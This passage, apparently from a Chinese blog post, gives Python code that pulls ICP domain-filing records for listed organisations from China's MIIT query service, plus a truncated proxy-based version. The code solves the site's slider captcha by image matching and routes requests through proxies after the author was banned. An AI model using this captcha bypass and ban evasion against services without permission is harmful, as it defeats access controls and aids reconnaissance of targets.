class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> openpyxl <span class="keyword">as</span> xl</span><br><span class="line"><span class="keyword">from</span> openpyxl.styles <span class="keyword">import</span> Alignment</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;no_proxy&#x27;</span>] = <span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_targets_from_file</span>(<span class="params">file_path=<span class="string">&#x27;target.txt&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        targets = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines()]</span><br><span class="line">    <span class="keyword">return</span> targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    targets = read_targets_from_file()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在查询：<span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">        cookie = get_cookies()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">global</span> base_header</span><br><span class="line">                base_header = &#123;</span><br><span class="line">                    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://beian.miit.gov.cn&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://beian.miit.gov.cn/&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;__jsluid_s=<span class="subst">&#123;cookie&#125;</span>&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> cookie != -<span class="number">1</span>:</span><br><span class="line">                    token = get_token()</span><br><span class="line">                    <span class="keyword">if</span> token != -<span class="number">1</span>:</span><br><span class="line">                        check_data = get_check_pic(token)</span><br><span class="line">                        <span class="keyword">if</span> check_data != -<span class="number">1</span>:</span><br><span class="line">                            sign = get_sign(check_data, token)</span><br><span class="line">                            p_uuid = check_data[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">                            <span class="keyword">if</span> sign != -<span class="number">1</span>:</span><br><span class="line">                                info_data = query_base(target)</span><br><span class="line">                                domain_list = get_beian_info(info_data, p_uuid, token, sign)</span><br><span class="line">                                data_saver(domain_list, target)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Sign遇到错误，请重试！&quot;</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span> ValueError(<span class="string">&quot;计算图片缺口位置错误，请重试！&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Token失败，如频繁失败请关闭程序后等待几分钟再试！&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cookie = get_cookies()</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Cookie失败，请重试！&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e&#125;</span>\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">10</span>)  <span class="comment"># 等待10秒后查询下一个目标</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_base</span>(<span class="params">target</span>):</span><br><span class="line">    info = target.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;https://www.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;http://www.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    info = re.sub(<span class="string">&quot;[^\\u4e00-\\u9fa5-A-Za-z0-9,-.()（）]&quot;</span>, <span class="string">&quot;&quot;</span>, info)</span><br><span class="line">    info_data = &#123;<span class="string">&#x27;pageNum&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;unitName&#x27;</span>: info&#125;</span><br><span class="line">    <span class="keyword">return</span> info_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookies</span>():</span><br><span class="line">    cookie_headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32&#x27;</span>&#125;</span><br><span class="line">    err_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> err_num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cookie = requests.utils.dict_from_cookiejar(requests.get(<span class="string">&#x27;https://beian.miit.gov.cn/&#x27;</span>, headers=cookie_headers).cookies)[<span class="string">&#x27;__jsluid_s&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> cookie</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            err_num += <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>():</span><br><span class="line">    timeStamp = <span class="built_in">round</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    authSecret = <span class="string">&#x27;testtest&#x27;</span> + <span class="built_in">str</span>(timeStamp)</span><br><span class="line">    authKey = hashlib.md5(authSecret.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()</span><br><span class="line">    auth_data = &#123;<span class="string">&#x27;authKey&#x27;</span>: authKey, <span class="string">&#x27;timeStamp&#x27;</span>: timeStamp&#125;</span><br><span class="line">    url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/auth&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t_response = requests.post(url=url, data=auth_data, headers=base_header).json()</span><br><span class="line">        token = t_response[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;bussiness&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_check_pic</span>(<span class="params">token</span>):</span><br><span class="line">    url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/image/getCheckImage&#x27;</span></span><br><span class="line">    base_header[<span class="string">&#x27;Accept&#x27;</span>] = <span class="string">&#x27;application/json, text/plain, */*&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p_request = requests.post(url=url, data=<span class="string">&#x27;&#x27;</span>, headers=base_header).json()</span><br><span class="line">        p_uuid = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">        big_image = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;bigImage&#x27;</span>]</span><br><span class="line">        small_image = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;smallImage&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="comment"># 解码图片，写入并计算图片缺口位置</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bigImage.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(big_image))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;smallImage.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(small_image))</span><br><span class="line">    background_image = cv2.imread(<span class="string">&#x27;bigImage.jpg&#x27;</span>, cv2.COLOR_GRAY2RGB)</span><br><span class="line">    fill_image = cv2.imread(<span class="string">&#x27;smallImage.jpg&#x27;</span>, cv2.COLOR_GRAY2RGB)</span><br><span class="line">    position_match = cv2.matchTemplate(background_image, fill_image, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">    max_loc = cv2.minMaxLoc(position_match)[<span class="number">3</span>][<span class="number">0</span>]</span><br><span class="line">    mouse_length = max_loc + <span class="number">1</span></span><br><span class="line">    os.remove(<span class="string">&#x27;bigImage.jpg&#x27;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;smallImage.jpg&#x27;</span>)</span><br><span class="line">    check_data = &#123;<span class="string">&#x27;key&#x27;</span>: p_uuid, <span class="string">&#x27;value&#x27;</span>: mouse_length&#125;</span><br><span class="line">    <span class="keyword">return</span> check_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sign</span>(<span class="params">check_data, token</span>):</span><br><span class="line">    check_url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/image/checkImage&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pic_sign = requests.post(check_url, json=check_data, headers=base_header).json()</span><br><span class="line">        sign = pic_sign[<span class="string">&#x27;params&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_beian_info</span>(<span class="params">info_data, p_uuid, token, sign</span>):</span><br><span class="line">    domain_list = []</span><br><span class="line">    info_url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/icpAbbreviateInfo/queryByCondition&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>: p_uuid, <span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;sign&#x27;</span>: sign&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        beian_info = requests.post(url=info_url, json=info_data, headers=base_header).json()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> beian_info[<span class="string">&quot;success&quot;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;请求错误: CODE <span class="subst">&#123;beian_info[<span class="string">&quot;code&quot;</span>]&#125;</span> MSG <span class="subst">&#123;beian_info[<span class="string">&quot;msg&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> domain_list</span><br><span class="line">        domain_total = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;total&#x27;</span>]</span><br><span class="line">        page_total = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;lastPage&#x27;</span>]</span><br><span class="line">        end_row = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;endRow&#x27;</span>]</span><br><span class="line">        info = info_data[<span class="string">&#x27;unitName&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n查询对象：<span class="subst">&#123;info&#125;</span> 共有 <span class="subst">&#123;domain_total&#125;</span> 个已备案域名\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, page_total):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在查询第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>页……\n&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, end_row + <span class="number">1</span>):</span><br><span class="line">                info_base = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;list&#x27;</span>][k]</span><br><span class="line">                domain_name = info_base[<span class="string">&#x27;domain&#x27;</span>]</span><br><span class="line">                domain_type = info_base[<span class="string">&#x27;natureName&#x27;</span>]</span><br><span class="line">                domain_licence = info_base[<span class="string">&#x27;mainLicence&#x27;</span>]</span><br><span class="line">                website_licence = info_base[<span class="string">&#x27;serviceLicence&#x27;</span>]</span><br><span class="line">                domain_status = info_base[<span class="string">&#x27;limitAccess&#x27;</span>]</span><br><span class="line">                domain_approve_date = info_base[<span class="string">&#x27;updateRecordTime&#x27;</span>]</span><br><span class="line">                domain_owner = info_base[<span class="string">&#x27;unitName&#x27;</span>]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    domain_content_approved = info_base[<span class="string">&#x27;contentTypeName&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> domain_content_approved == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        domain_content_approved = <span class="string">&quot;无&quot;</span></span><br><span class="line">                <span class="keyword">except</span> KeyError:</span><br><span class="line">                    domain_content_approved = <span class="string">&quot;无&quot;</span></span><br><span class="line">                row_data = domain_owner, domain_name, domain_licence, website_licence, domain_type, domain_content_approved, domain_status, domain_approve_date</span><br><span class="line">                domain_list.append(row_data)</span><br><span class="line">            info_data = &#123;<span class="string">&#x27;pageNum&#x27;</span>: i + <span class="number">2</span>, <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;unitName&#x27;</span>: info&#125;</span><br><span class="line">            <span class="keyword">if</span> beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;isLastPage&#x27;</span>] <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                beian_info = requests.post(info_url, json=info_data, headers=base_header).json()</span><br><span class="line">                end_row = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;endRow&#x27;</span>]</span><br><span class="line">                time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;意外错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> domain_list</span><br><span class="line">    <span class="keyword">return</span> domain_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 data_saver 函数，添加 target 参数，将 target 作为工作表名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_saver</span>(<span class="params">domain_list, target</span>):</span><br><span class="line">    total_row = <span class="built_in">len</span>(domain_list)</span><br><span class="line">    <span class="keyword">if</span> total_row == <span class="number">1</span>:</span><br><span class="line">        total_row = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> total_row == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;所查域名无备案\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;查询结果如下:\n\n<span class="subst">&#123;domain_list&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">        <span class="keyword">import</span> winreg</span><br><span class="line">        subkey = <span class="string">r&#x27;Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&#x27;</span></span><br><span class="line">        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, <span class="number">0</span>)</span><br><span class="line">        desktop_raw = <span class="built_in">str</span>(winreg.QueryValueEx(key, <span class="string">&quot;Desktop&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> desktop_raw == <span class="string">&quot;%USERPROFILE%\Desktop&quot;</span>:</span><br><span class="line">            subkey = <span class="string">r&#x27;Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&#x27;</span></span><br><span class="line">            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, <span class="number">0</span>)</span><br><span class="line">            desktop_raw = <span class="built_in">str</span>(winreg.QueryValueEx(key, <span class="string">&quot;Desktop&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">        desktop_path = desktop_raw.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">        file_path = <span class="string">f&quot;<span class="subst">&#123;desktop_path&#125;</span>备案信息.xlsx&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_path = <span class="string">&#x27;./备案信息.xlsx&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">        wb = xl.load_workbook(file_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        wb = xl.Workbook()</span><br><span class="line">    ws = wb.create_sheet(target)</span><br><span class="line">    title_list = [<span class="string">&#x27;域名主办方&#x27;</span>, <span class="string">&#x27;域名&#x27;</span>, <span class="string">&#x27;备案许可证号&#x27;</span>, <span class="string">&#x27;网站备案号&#x27;</span>, <span class="string">&#x27;域名类型&#x27;</span>, <span class="string">&#x27;网站前置审批项&#x27;</span>, <span class="string">&#x27;是否限制接入&#x27;</span>, <span class="string">&#x27;审核通过日期&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">        ws.cell(<span class="number">1</span>, i + <span class="number">1</span>).value = title_list[i]</span><br><span class="line">    col_width = &#123;<span class="string">&#x27;A&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;E&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;F&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;G&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;H&#x27;</span>: <span class="number">21</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> col_width.items():</span><br><span class="line">        ws.column_dimensions[k].width = v</span><br><span class="line">    ws.freeze_panes = <span class="string">&#x27;A2&#x27;</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    after_title = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start, total_row + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ws.cell(j + after_title, k + <span class="number">1</span>).value = domain_list[j - start][k]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(ws.max_row):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(ws.max_column):</span><br><span class="line">            ws.cell(row + <span class="number">1</span>, col + <span class="number">1</span>).alignment = Alignment(horizontal=<span class="string">&#x27;center&#x27;</span>, vertical=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        wb.save(file_path)</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;** 备案信息登记表格已打开，无法写入文件。如需写入，请关闭文件后重新执行！ **\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;查询结果保存在：<span class="subst">&#123;file_path&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>md跑一会就被ban了，上代理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> openpyxl <span class="keyword">as</span> xl</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> openpyxl.styles <span class="keyword">import</span> Alignment</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://username:passwd@x.x.x.x:port&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://username:passwd@x.x.x.x:port&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_targets_from_file</span>(<span class="params">file_path=<span class="string">&#x27;target.txt&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        targets = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines()]</span><br><span class="line">    <span class="keyword">return</span> targets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_with_retry</span>(<span class="params">method, url, proxies, timeout=<span class="number">10</span>, retries=<span class="number">3</span>, **kwargs</span>):</span><br><span class="line">    <span class="keyword">while</span> retries &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                response = requests.get(url, timeout=timeout, proxies=proxies, **kwargs)</span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">                response = requests.post(url, timeout=timeout, proxies=proxies, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid method&#x27;</span>)</span><br><span class="line">            <span 